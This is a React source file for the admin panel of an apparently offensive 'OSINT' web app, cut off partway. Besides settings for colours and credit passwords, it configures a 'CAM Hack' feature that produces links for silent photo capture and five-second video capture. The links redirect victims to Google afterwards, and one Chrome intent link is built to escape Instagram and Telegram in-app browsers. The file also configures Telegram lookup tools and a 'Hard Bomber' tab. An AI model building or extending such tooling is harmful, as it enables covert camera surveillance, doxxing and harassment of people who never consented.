import { useState, useEffect } from "react";
import { 
  Settings, 
  Palette, 
  Key, 
  History, 
  LayoutGrid,
  Database,
  ArrowLeft,
  Save,
  Trash2,
  RefreshCw,
  Shield,
  Eye,
  EyeOff,
  ExternalLink,
  Type,
  Upload,
  X,
  Image,
  Send,
  Camera,
  Music,
  Coins,
  Plus,
  Power,
  RotateCcw,
  Loader2,
  ChevronDown,
  ChevronUp
} from "lucide-react";
import * as Icons from "lucide-react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Switch } from "@/components/ui/switch";
import { toast } from "@/hooks/use-toast";
import { useSettings } from "@/contexts/SettingsContext";
import { supabase } from "@/integrations/supabase/client";

interface PasswordRecord {
  id: string;
  password_display: string;
  total_credits: number;
  remaining_credits: number;
  is_enabled: boolean;
  is_used: boolean;
  is_unlimited: boolean;
  device_id: string | null;
  created_at: string;
  used_at: string | null;
  credit_usage?: Array<{
    id: string;
    search_type: string;
    credits_used: number;
    created_at: string;
  }>;
}

const colorOptions = [
  { value: "green", label: "Green", color: "bg-neon-green" },
  { value: "pink", label: "Pink", color: "bg-neon-pink" },
  { value: "orange", label: "Orange", color: "bg-neon-orange" },
  { value: "cyan", label: "Cyan", color: "bg-neon-cyan" },
  { value: "red", label: "Red", color: "bg-neon-red" },
  { value: "purple", label: "Purple", color: "bg-neon-purple" },
  { value: "yellow", label: "Yellow", color: "bg-neon-yellow" },
  { value: "blue", label: "Blue", color: "bg-neon-blue" },
];

const iconOptions = [
  "Zap", "Sparkles", "Shield", "Terminal", "Code", "Wifi", "Globe", 
  "Eye", "Lock", "Skull", "Bug", "Fingerprint", "Radar", "Search",
  "Database", "Server", "Cpu", "Binary", "Hash", "Key"
];

const fontOptions = [
  { value: "Orbitron", label: "Orbitron", style: "font-display" },
  { value: "Share Tech Mono", label: "Share Tech Mono", style: "font-mono" },
  { value: "Courier New", label: "Courier New", style: "font-mono" },
  { value: "Impact", label: "Impact", style: "font-sans" },
  { value: "Georgia", label: "Georgia", style: "font-serif" },
  { value: "Arial Black", label: "Arial Black", style: "font-sans" },
  { value: "Verdana", label: "Verdana", style: "font-sans" },
  { value: "Times New Roman", label: "Times New Roman", style: "font-serif" },
];

const headerStyleOptions = [
  { value: "normal", label: "Normal" },
  { value: "uppercase", label: "UPPERCASE" },
  { value: "lowercase", label: "lowercase" },
  { value: "capitalize", label: "Capitalize" },
  { value: "italic", label: "Italic" },
  { value: "bold", label: "Bold" },
  { value: "glow", label: "Glow Effect" },
  { value: "flicker", label: "Neon Flicker" },
];

interface SearchHistoryItem {
  id: string;
  search_type: string;
  search_query: string;
  searched_at: string;
}

// Collapsible Section Component
const Section = ({ 
  title, 
  icon: Icon, 
  color, 
  children,
  defaultOpen = false
}: { 
  title: string; 
  icon: React.ElementType; 
  color: string; 
  children: React.ReactNode;
  defaultOpen?: boolean;
}) => {
  const [isOpen, setIsOpen] = useState(defaultOpen);
  
  return (
    <div className={`border border-${color}/30 rounded-xl overflow-hidden`}>
      <button
        onClick={() => setIsOpen(!isOpen)}
        className={`w-full flex items-center justify-between p-4 bg-${color}/10 hover:bg-${color}/20 transition-all`}
      >
        <div className="flex items-center gap-3">
          <Icon className={`w-5 h-5 text-${color}`} />
          <h2 className={`font-display font-bold text-${color}`}>{title}</h2>
        </div>
        {isOpen ? (
          <ChevronUp className={`w-5 h-5 text-${color}`} />
        ) : (
          <ChevronDown className={`w-5 h-5 text-${color}`} />
        )}
      </button>
      {isOpen && (
        <div className="p-4 space-y-4 bg-card/30">
          {children}
        </div>
      )}
    </div>
  );
};

const Admin = () => {
  const navigate = useNavigate();
  const { settings, updateSettings, updateTab, updateTelegramTool, resetSettings, saveNow } = useSettings();
  const [showSitePassword, setShowSitePassword] = useState(false);
  const [showAdminPassword, setShowAdminPassword] = useState(false);
  const [showAllSearchKey, setShowAllSearchKey] = useState(false);
  const [showTelegramKey, setShowTelegramKey] = useState(false);
  const [searchHistory, setSearchHistory] = useState<SearchHistoryItem[]>([]);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [adminPasswordInput, setAdminPasswordInput] = useState("");

  // Local state for editing
  const [localSitePassword, setLocalSitePassword] = useState(settings.sitePassword);
  const [localAdminPassword, setLocalAdminPassword] = useState(settings.adminPassword);
  const [localAllSearchKey, setLocalAllSearchKey] = useState(settings.allSearchAccessKey || "");
  const [localTelegramKey, setLocalTelegramKey] = useState(settings.telegramOsintAccessKey || "");

  // Credit Password Management State
  const [passwordRecords, setPasswordRecords] = useState<PasswordRecord[]>([]);
  const [isLoadingPasswords, setIsLoadingPasswords] = useState(false);
  const [newCredits, setNewCredits] = useState("50");
  const [customPassword, setCustomPassword] = useState("");
  const [isCreating, setIsCreating] = useState(false);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [editCredits, setEditCredits] = useState("");

  useEffect(() => {
    if (isAuthenticated) {
      fetchSearchHistory();
      fetchPasswords();
    }
  }, [isAuthenticated]);

  const fetchSearchHistory = async () => {
    const { data, error } = await supabase
      .from("search_history")
      .select("*")
      .order("searched_at", { ascending: false })
      .limit(100);

    if (!error && data) {
      setSearchHistory(data);
    }
  };

  const clearSearchHistory = async () => {
    const { error } = await supabase.from("search_history").delete().neq("id", "00000000-0000-0000-0000-000000000000");
    if (!error) {
      setSearchHistory([]);
      toast({ title: "History Cleared", description: "All search history deleted" });
    }
  };

  // Credit Password Management Functions
  const fetchPasswords = async () => {
    setIsLoadingPasswords(true);
    try {
      const { data, error } = await supabase.functions.invoke('admin-passwords', {
        body: { action: 'list', adminPassword: settings.adminPassword }
      });
      if (error) throw error;
      setPasswordRecords(data.passwords || []);
    } catch (err) {
      console.error('Error fetching passwords:', err);
      toast({ title: "Error", description: "Failed to fetch passwords", variant: "destructive" });
    } finally {
      setIsLoadingPasswords(false);
    }
  };

  const createPassword = async () => {
    const credits = parseInt(newCredits);
    if (isNaN(credits) || credits < 1) {
      toast({ title: "Error", description: "Credits must be at least 1", variant: "destructive" });
      return;
    }
    if (customPassword && customPassword.trim().length < 4) {
      toast({ title: "Error", description: "Custom password must be at least 4 characters", variant: "destructive" });
      return;
    }
    setIsCreating(true);
    try {
      const { data, error } = await supabase.functions.invoke('admin-passwords', {
        body: { 
          action: 'create', 
          adminPassword: settings.adminPassword, 
          credits,
          customPassword: customPassword.trim() || undefined
        }
      });
      if (error) throw error;
      toast({ title: "Password Created", description: `Password: ${data.password.password_display}` });
      setCustomPassword("");
      fetchPasswords();
    } catch (err) {
      toast({ title: "Error", description: "Failed to create password", variant: "destructive" });
    } finally {
      setIsCreating(false);
    }
  };

  const updatePassword = async (passwordId: string, updates: { credits?: number; isEnabled?: boolean; isUnlimited?: boolean }) => {
    try {
      const { error } = await supabase.functions.invoke('admin-passwords', {
        body: { action: 'update', adminPassword: settings.adminPassword, passwordId, ...updates }
      });
      if (error) throw error;
      toast({ title: "Updated", description: "Password updated successfully" });
      fetchPasswords();
      setEditingId(null);
    } catch (err) {
      toast({ title: "Error", description: "Failed to update", variant: "destructive" });
    }
  };

  const deletePassword = async (passwordId: string) => {
    try {
      const { error } = await supabase.functions.invoke('admin-passwords', {
        body: { action: 'delete', adminPassword: settings.adminPassword, passwordId }
      });
      if (error) throw error;
      toast({ title: "Deleted", description: "Password deleted" });
      fetchPasswords();
    } catch (err) {
      toast({ title: "Error", description: "Failed to delete", variant: "destructive" });
    }
  };

  const resetPassword = async (passwordId: string) => {
    try {
      const { error } = await supabase.functions.invoke('admin-passwords', {
        body: { action: 'reset', adminPassword: settings.adminPassword, passwordId }
      });
      if (error) throw error;
      toast({ title: "Reset", description: "Password reset - can be used on new device" });
      fetchPasswords();
    } catch (err) {
      toast({ title: "Error", description: "Failed to reset", variant: "destructive" });
    }
  };

  const handleAdminLogin = () => {
    if (adminPasswordInput === settings.adminPassword) {
      setIsAuthenticated(true);
      toast({ title: "Access Granted", description: "Welcome to Admin Panel" });
    } else {
      toast({ title: "Access Denied", description: "Wrong admin password", variant: "destructive" });
    }
  };

  const savePasswords = () => {
    updateSettings({ 
      sitePassword: localSitePassword, 
      adminPassword: localAdminPassword,
      allSearchAccessKey: localAllSearchKey,
      telegramOsintAccessKey: localTelegramKey
    });
    toast({ title: "Saved", description: "Passwords & Access Keys updated successfully" });
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="fixed inset-0 cyber-grid opacity-[0.03]" />
        <div className="relative w-full max-w-sm">
          <div className="absolute -inset-[2px] bg-gradient-to-r from-neon-red via-neon-orange to-neon-yellow rounded-2xl opacity-80 blur-sm animate-pulse" />
          <div className="relative bg-background border-2 border-neon-orange/50 rounded-2xl p-6 space-y-6">
            <div className="flex justify-center">
              <div className="relative w-16 h-16 rounded-full bg-gradient-to-br from-neon-red/30 to-neon-orange/30 flex items-center justify-center border-2 border-neon-orange/50">
                <Shield className="w-7 h-7 text-neon-orange" />
              </div>
            </div>
            <div className="text-center">
              <h1 className="text-xl font-display font-bold text-neon-orange">ADMIN ACCESS</h1>
              <p className="text-muted-foreground text-sm mt-1">Enter admin password</p>
            </div>
            <div className="space-y-4">
              <Input
                type="password"
                value={adminPasswordInput}
                onChange={(e) => setAdminPasswordInput(e.target.value)}
                placeholder="Admin password..."
                className="bg-background border-2 border-neon-orange/50 rounded-xl h-12 text-center"
                onKeyDown={(e) => e.key === "Enter" && handleAdminLogin()}
              />
              <Button
                onClick={handleAdminLogin}
                className="w-full h-12 rounded-xl bg-gradient-to-r from-neon-orange to-neon-red text-background font-bold"
              >
                LOGIN
              </Button>
              <Button
                variant="ghost"
                onClick={() => navigate("/")}
                className="w-full text-muted-foreground"
              >
                <ArrowLeft className="w-4 h-4 mr-2" /> Back to Home
              </Button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      <div className="fixed inset-0 cyber-grid opacity-[0.03]" />
      
      {/* Header */}
      <div className="relative border-b border-neon-orange/30 bg-background/95 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="icon" onClick={() => navigate("/")}>
              <ArrowLeft className="w-5 h-5 text-neon-orange" />
            </Button>
            <h1 className="text-xl font-display font-bold text-neon-orange">ADMIN PANEL</h1>
          </div>
          <Button variant="outline" size="sm" onClick={resetSettings} className="border-neon-red/50 text-neon-red hover:bg-neon-red/10">
            <RefreshCw className="w-4 h-4 mr-2" /> Reset All
          </Button>
        </div>
      </div>

      <div className="relative container mx-auto px-4 py-6 space-y-4">
        
        {/* Header Section */}
        <Section title="Header Settings" icon={Type} color="neon-cyan" defaultOpen={true}>
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-green">Website Title</h3>
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs text-muted-foreground mb-1 block">First Part</label>
                <Input
                  value={settings.headerName1}
                  onChange={(e) => updateSettings({ headerName1: e.target.value })}
                  placeholder="SHUBH"
                  className="h-10"
                />
              </div>
              <div>
                <label className="text-xs text-muted-foreground mb-1 block">Second Part</label>
                <Input
                  value={settings.headerName2}
                  onChange={(e) => updateSettings({ headerName2: e.target.value })}
                  placeholder="OSINT"
                  className="h-10"
                />
              </div>
            </div>
          </div>

          {/* Header Colors */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-cyan">Header Colors</h3>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="text-xs text-muted-foreground mb-2 block">First Part Color</label>
                <div className="grid grid-cols-4 gap-2">
                  {colorOptions.map((c) => (
                    <button
                      key={c.value}
                      onClick={() => updateSettings({ headerColor1: c.value })}
                      className={`h-10 rounded-lg ${c.color} transition-all ${
                        settings.headerColor1 === c.value 
                          ? "ring-2 ring-white scale-110" 
                          : "opacity-60 hover:opacity-100"
                      }`}
                      title={c.label}
                    />
                  ))}
                </div>
              </div>
              <div>
                <label className="text-xs text-muted-foreground mb-2 block">Second Part Color</label>
                <div className="grid grid-cols-4 gap-2">
                  {colorOptions.map((c) => (
                    <button
                      key={c.value}
                      onClick={() => updateSettings({ headerColor2: c.value })}
                      className={`h-10 rounded-lg ${c.color} transition-all ${
                        settings.headerColor2 === c.value 
                          ? "ring-2 ring-white scale-110" 
                          : "opacity-60 hover:opacity-100"
                      }`}
                      title={c.label}
                    />
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* Font Selection */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-orange">Header Font</h3>
            <div className="grid grid-cols-2 gap-2">
              {fontOptions.map((font) => (
                <button
                  key={font.value}
                  onClick={() => updateSettings({ headerFont: font.value })}
                  style={{ fontFamily: font.value }}
                  className={`p-3 rounded-lg border-2 transition-all text-sm ${
                    settings.headerFont === font.value
                      ? "border-neon-orange bg-neon-orange/10"
                      : "border-border/50 hover:border-neon-orange/50"
                  }`}
                >
                  {font.label}
                </button>
              ))}
            </div>
          </div>

          {/* Header Style */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-pink">Header Style</h3>
            <div className="grid grid-cols-4 gap-2">
              {headerStyleOptions.map((style) => (
                <button
                  key={style.value}
                  onClick={() => updateSettings({ headerStyle: style.value })}
                  className={`p-2 rounded-lg border-2 transition-all text-xs ${
                    settings.headerStyle === style.value
                      ? "border-neon-pink bg-neon-pink/10"
                      : "border-border/50 hover:border-neon-pink/50"
                  }`}
                >
                  {style.label}
                </button>
              ))}
            </div>
          </div>

          {/* Custom Logo */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-pink">Custom Logo (Optional)</h3>
            <p className="text-xs text-muted-foreground">Upload a custom image to replace the header icon</p>
            
            {settings.headerCustomLogo ? (
              <div className="flex items-center gap-4">
                <img src={settings.headerCustomLogo} alt="Custom Logo" className="w-16 h-16 object-contain rounded-lg border border-neon-pink" />
                <Button
                  variant="outline"
                  onClick={() => updateSettings({ headerCustomLogo: "" })}
                  className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
                >
                  <X className="w-4 h-4 mr-1" /> Remove
                </Button>
              </div>
            ) : (
              <label className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-neon-pink/50 rounded-xl cursor-pointer hover:bg-neon-pink/5 transition-all">
                <Upload className="w-6 h-6 text-neon-pink mb-1" />
                <span className="text-sm text-neon-pink">Click to upload image</span>
                <input
                  type="file"
                  accept="image/*"
                  className="hidden"
                  onChange={(e) => {
                    const file = e.target.files?.[0];
                    if (file) {
                      const reader = new FileReader();
                      reader.onloadend = () => {
                        updateSettings({ headerCustomLogo: reader.result as string });
                      };
                      reader.readAsDataURL(file);
                    }
                  }}
                />
              </label>
            )}
          </div>

          {/* Header Icon */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-cyan">Header Icon (used if no custom logo)</h3>
            <div className="grid grid-cols-5 gap-2">
              {iconOptions.map((iconName) => {
                const IconComp = Icons[iconName as keyof typeof Icons] as React.FC<{ className?: string }>;
                return IconComp ? (
                  <button
                    key={iconName}
                    onClick={() => updateSettings({ headerIcon: iconName })}
                    className={`p-3 rounded-lg border-2 transition-all flex flex-col items-center gap-1 ${
                      settings.headerIcon === iconName && !settings.headerCustomLogo
                        ? "border-neon-green bg-neon-green/10 shadow-[0_0_10px_hsl(var(--neon-green)/0.5)]"
                        : "border-border/50 hover:border-neon-green/50"
                    }`}
                  >
                    <IconComp className="w-5 h-5 text-neon-green" />
                    <span className="text-[10px] text-muted-foreground">{iconName}</span>
                  </button>
                ) : null;
              })}
            </div>
          </div>
        </Section>

        {/* Background Section */}
        <Section title="Background Settings" icon={Image} color="neon-pink">
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-green flex items-center gap-2">
              <Image className="w-4 h-4" /> Custom Background Image
            </h3>
            <p className="text-xs text-muted-foreground">Upload a custom background image for the website. Leave empty for solid black background.</p>
            
            {settings.backgroundImage ? (
              <div className="space-y-4">
                <div className="w-full h-40 rounded-xl border-2 border-neon-green overflow-hidden">
                  <img src={settings.backgroundImage} alt="Background Preview" className="w-full h-full object-cover" />
                </div>
                <Button
                  variant="outline"
                  onClick={async () => {
                    // If it's a storage URL, try to delete the file
                    if (settings.backgroundImage.includes('/storage/v1/object/public/backgrounds/')) {
                      const fileName = settings.backgroundImage.split('/backgrounds/').pop();
                      if (fileName) {
                        await supabase.storage.from('backgrounds').remove([fileName]);
                      }
                    }
                    updateSettings({ backgroundImage: "" });
                  }}
                  className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
                >
                  <X className="w-4 h-4 mr-1" /> Remove Background
                </Button>
              </div>
            ) : (
              <label className="flex flex-col items-center justify-center w-full h-32 border-2 border-dashed border-neon-cyan/50 rounded-xl cursor-pointer hover:bg-neon-cyan/5 transition-all">
                <Upload className="w-8 h-8 text-neon-cyan mb-2" />
                <span className="text-sm text-neon-cyan">Click to upload background image</span>
                <span className="text-xs text-muted-foreground mt-1">Recommended: High resolution image</span>
                <input
                  type="file"
                  accept="image/*"
                  className="hidden"
                  onChange={async (e) => {
                    const file = e.target.files?.[0];
                    if (file) {
                      try {
                        toast({ title: "Uploading...", description: "Uploading background image..." });
                        
                        // Generate unique filename
                        const fileName = `background-${Date.now()}.${file.name.split('.').pop()}`;
                        
                        // Upload to Supabase Storage
                        const { data, error } = await supabase.storage
                          .from('backgrounds')
                          .upload(fileName, file, { upsert: true });
                        
                        if (error) throw error;
                        
                        // Get public URL
                        const { data: urlData } = supabase.storage
                          .from('backgrounds')
                          .getPublicUrl(fileName);
                        
                        updateSettings({ backgroundImage: urlData.publicUrl });
                        toast({ title: "Success!", description: "Background image uploaded successfully!" });
                      } catch (err) {
                        console.error('Upload error:', err);
                        toast({ title: "Upload Failed", description: "Could not upload image. Please try again.", variant: "destructive" });
                      }
                    }
                  }}
                />
              </label>
            )}
          </div>

          {/* Background Opacity */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-pink flex items-center gap-2">
              <Eye className="w-4 h-4" /> Background Visibility
            </h3>
            <p className="text-xs text-muted-foreground">
              Adjust how visible the background image is. Lower overlay = more visible background.
            </p>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-sm text-neon-cyan">Dark Overlay: {settings.backgroundOpacity || "30"}%</span>
                <span className="text-sm text-neon-green">Background Visible: {100 - parseInt(settings.backgroundOpacity || "30")}%</span>
              </div>
              <input
                type="range"
                min="0"
                max="80"
                value={settings.backgroundOpacity || "30"}
                onChange={(e) => updateSettings({ backgroundOpacity: e.target.value })}
                className="w-full h-2 bg-card rounded-lg appearance-none cursor-pointer accent-neon-pink"
              />
              <div className="flex justify-between text-xs text-muted-foreground">
                <span>Max Visible</span>
                <span>More Dark</span>
              </div>
            </div>
          </div>
        </Section>

        {/* Tabs Section */}
        <Section title="Tab Configuration" icon={LayoutGrid} color="neon-green">
          {settings.tabs.map((tab) => (
            <div key={tab.id} className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className={`w-3 h-3 rounded-full bg-neon-${tab.color}`} />
                  <span className="font-bold text-foreground">{tab.label}</span>
                </div>
                <Switch
                  checked={tab.enabled}
                  onCheckedChange={(enabled) => updateTab(tab.id, { enabled })}
                />
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div>
                  <label className="text-xs text-muted-foreground mb-1 block">Tab Name</label>
                  <Input
                    value={tab.label}
                    onChange={(e) => updateTab(tab.id, { label: e.target.value })}
                    className="h-9 text-sm"
                  />
                </div>
                <div>
                  <label className="text-xs text-muted-foreground mb-1 block">Color</label>
                  <select
                    value={tab.color}
                    onChange={(e) => updateTab(tab.id, { color: e.target.value })}
                    className="w-full h-9 rounded-md border border-input bg-background px-3 text-sm"
                  >
                    {colorOptions.map((c) => (
                      <option key={c.value} value={c.value}>{c.label}</option>
                    ))}
                  </select>
                </div>
              </div>

              <div>
                <label className="text-xs text-muted-foreground mb-1 block">Placeholder</label>
                <Input
                  value={tab.placeholder}
                  onChange={(e) => updateTab(tab.id, { placeholder: e.target.value })}
                  className="h-9 text-sm"
                />
              </div>

              {tab.searchType !== "shubh" && (
                <div>
                  <label className="text-xs text-muted-foreground mb-1 block">API URL (query appended at end)</label>
                  <Input
                    value={tab.apiUrl}
                    onChange={(e) => updateTab(tab.id, { apiUrl: e.target.value })}
                    placeholder="https://api.example.com/search?q="
                    className="h-9 text-sm font-mono"
                  />
                </div>
              )}
            </div>
          ))}
        </Section>

        {/* DARK DB Section */}
        <Section title="Hard Bomber (DARK DB)" icon={Database} color="neon-purple">
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-yellow">Tab Name</h3>
            <Input
              value={settings.tabs.find(t => t.searchType === "darkdb")?.label || "Hard Bomber"}
              onChange={(e) => updateTab("darkdb", { label: e.target.value })}
              placeholder="Hard Bomber"
              className="text-sm"
            />
          </div>
          
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-cyan">Website URL</h3>
            <Input
              value={settings.darkDbUrl}
              onChange={(e) => updateSettings({ darkDbUrl: e.target.value })}
              placeholder="https://example.com"
              className="font-mono text-sm"
            />
          </div>

          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-green">Iframe Height (vh)</h3>
            <div className="flex items-center gap-3">
              <Input
                type="number"
                min="10"
                max="100"
                value={settings.darkDbHeight}
                onChange={(e) => updateSettings({ darkDbHeight: e.target.value })}
                className="w-24"
              />
              <span className="text-muted-foreground">vh</span>
              <div className="flex-1 flex gap-2">
                {["50", "70", "80", "90"].map((h) => (
                  <button
                    key={h}
                    onClick={() => updateSettings({ darkDbHeight: h })}
                    className={`px-3 py-1 rounded-lg border text-sm transition-all ${
                      settings.darkDbHeight === h
                        ? "border-neon-green bg-neon-green/20 text-neon-green"
                        : "border-border/50 text-muted-foreground hover:border-neon-green/50"
                    }`}
                  >
                    {h}vh
                  </button>
                ))}
              </div>
            </div>
          </div>

          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-pink">Border Color</h3>
            <div className="grid grid-cols-7 gap-2">
              {colorOptions.map((c) => (
                <button
                  key={c.value}
                  onClick={() => updateSettings({ darkDbBorderColor: c.value })}
                  className={`h-10 rounded-lg ${c.color} transition-all ${
                    settings.darkDbBorderColor === c.value 
                      ? "ring-2 ring-white scale-110" 
                      : "opacity-60 hover:opacity-100"
                  }`}
                  title={c.label}
                />
              ))}
            </div>
          </div>

          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-orange">Border Width</h3>
            <div className="flex gap-2">
              {["0", "1", "2", "3", "4"].map((w) => (
                <button
                  key={w}
                  onClick={() => updateSettings({ darkDbBorderWidth: w })}
                  className={`px-4 py-2 rounded-lg border-2 transition-all ${
                    settings.darkDbBorderWidth === w
                      ? "border-neon-orange bg-neon-orange/20 text-neon-orange"
                      : "border-border/50 text-muted-foreground hover:border-neon-orange/50"
                  }`}
                >
                  {w === "0" ? "None" : `${w}px`}
                </button>
              ))}
            </div>
          </div>
        </Section>

        {/* Telegram Section */}
        <Section title="Telegram OSINT" icon={Send} color="neon-blue">
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-green">JWT Token</h3>
            <p className="text-xs text-muted-foreground">API authentication token for funstat.info</p>
            <textarea
              value={settings.telegramOsint?.jwtToken || ""}
              onChange={(e) => updateSettings({ 
                telegramOsint: { ...settings.telegramOsint, jwtToken: e.target.value } 
              })}
              placeholder="eyJhbGciOiJSUzI1NiIs..."
              className="w-full font-mono text-xs bg-background border border-border rounded-lg p-3 min-h-[100px] resize-y break-all"
              spellCheck={false}
            />
            <Button 
              onClick={async () => {
                try {
                  await saveNow();
                  toast({ title: "JWT Token saved successfully!", description: "Token has been updated in the database." });
                } catch {
                  toast({ title: "Save failed", description: "Please try again.", variant: "destructive" });
                }
              }}
              className="w-full bg-neon-green/20 border border-neon-green text-neon-green hover:bg-neon-green/30"
            >
              <Save className="w-4 h-4 mr-2" />
              Save JWT Token
            </Button>
          </div>

          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-pink">API Base URL</h3>
            <Input
              value={settings.telegramOsint?.baseUrl || "https://funstat.info"}
              onChange={(e) => updateSettings({ 
                telegramOsint: { ...settings.telegramOsint, baseUrl: e.target.value } 
              })}
              placeholder="https://funstat.info"
              className="font-mono text-sm"
            />
          </div>

          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-orange">Tools Configuration</h3>
            <div className="space-y-3 mt-4">
              {settings.telegramOsint?.tools?.map((tool) => (
                <div key={tool.id} className="flex items-center gap-3 p-3 bg-background/50 rounded-lg border border-border/30">
                  <Switch
                    checked={tool.enabled}
                    onCheckedChange={(checked) => updateTelegramTool(tool.id, { enabled: checked })}
                  />
                  <div className="flex-1">
                    <Input
                      value={tool.label}
                      onChange={(e) => updateTelegramTool(tool.id, { label: e.target.value })}
                      className="h-8 text-sm"
                    />
                  </div>
                  <span className={`text-xs px-2 py-1 rounded ${
                    tool.cost === 'FREE' 
                      ? 'bg-neon-green/20 text-neon-green' 
                      : 'bg-neon-yellow/20 text-neon-yellow'
                  }`}>
                    {tool.cost}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </Section>

        {/* CAM Hack Section */}
        <Section title="CAM Hack Settings" icon={Camera} color="neon-red">
          {/* Session ID */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-green flex items-center gap-2">
              <Database className="w-4 h-4" /> Session ID
            </h3>
            <p className="text-xs text-muted-foreground">Unique ID to identify photos/videos from your links (synced across all devices)</p>
            <div className="flex gap-2">
              <Input
                value={settings.camSessionId}
                onChange={(e) => updateSettings({ camSessionId: e.target.value })}
                placeholder="shubhcam01"
                className="font-mono"
              />
              <Button
                variant="outline"
                onClick={() => {
                  const newId = Math.random().toString(36).substring(2, 10);
                  updateSettings({ camSessionId: newId });
                  toast({ title: "New Session", description: `Session ID: ${newId}` });
                }}
                className="border-neon-green text-neon-green hover:bg-neon-green/10"
              >
                <RefreshCw className="w-4 h-4" />
              </Button>
            </div>
          </div>

          {/* Redirect URL */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-pink">Redirect URL</h3>
            <p className="text-xs text-muted-foreground">Where to redirect users after capture (photo/video)</p>
            <Input
              value={settings.camRedirectUrl}
              onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
              placeholder="https://google.com"
              className="font-mono text-sm"
            />
          </div>

          {/* All Capture Links */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-yellow flex items-center gap-2">
              <ExternalLink className="w-4 h-4" /> All Capture Links
            </h3>
            
            {/* Silent Photo Capture */}
            <div className="p-3 bg-neon-pink/10 rounded-lg border border-neon-pink/30">
              <label className="text-xs text-neon-pink font-bold mb-2 block flex items-center gap-2">
                👁 Silent Photo Capture (Auto)
              </label>
              <div className="flex gap-2">
                <Input
                  readOnly
                  value={`${window.location.origin}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}`}
                  className="font-mono text-xs bg-background/50"
                />
                <Button
                  size="icon"
                  variant="outline"
                  onClick={() => {
                    navigator.clipboard.writeText(`${window.location.origin}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}`);
                    toast({ title: "Copied!", description: "Silent capture link copied" });
                  }}
                  className="border-neon-pink text-neon-pink"
                >
                  <Save className="w-4 h-4" />
                </Button>
              </div>
            </div>

            {/* Video Capture */}
            <div className="p-3 bg-neon-red/10 rounded-lg border border-neon-red/30">
              <label className="text-xs text-neon-red font-bold mb-2 block flex items-center gap-2">
                🎬 5 Second Video Capture
              </label>
              <div className="flex gap-2">
                <Input
                  readOnly
                  value={`${window.location.origin}/video-capture?session=${settings.camSessionId}&duration=5&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}`}
                  className="font-mono text-xs bg-background/50"
                />
                <Button
                  size="icon"
                  variant="outline"
                  onClick={() => {
                    navigator.clipboard.writeText(`${window.location.origin}/video-capture?session=${settings.camSessionId}&duration=5&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}`);
                    toast({ title: "Copied!", description: "Video capture link copied" });
                  }}
                  className="border-neon-red text-neon-red"
                >
                  <Save className="w-4 h-4" />
                </Button>
              </div>
            </div>

            {/* Chrome Intent */}
            <div className="p-3 bg-neon-orange/10 rounded-lg border border-neon-orange/30">
              <label className="text-xs text-neon-orange font-bold mb-2 block flex items-center gap-2">
                📱 Chrome Intent (Instagram/Telegram)
              </label>
              <div className="flex gap-2">
                <Input
                  readOnly
                  value={`intent://${window.location.origin.replace(/^https?:\/\//, '')}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}#Intent;scheme=https;package=com.android.chrome;end`}
                  className="font-mono text-xs bg-background/50"
                />
                <Button
                  size="icon"
                  variant="outline"
                  onClick={() => {
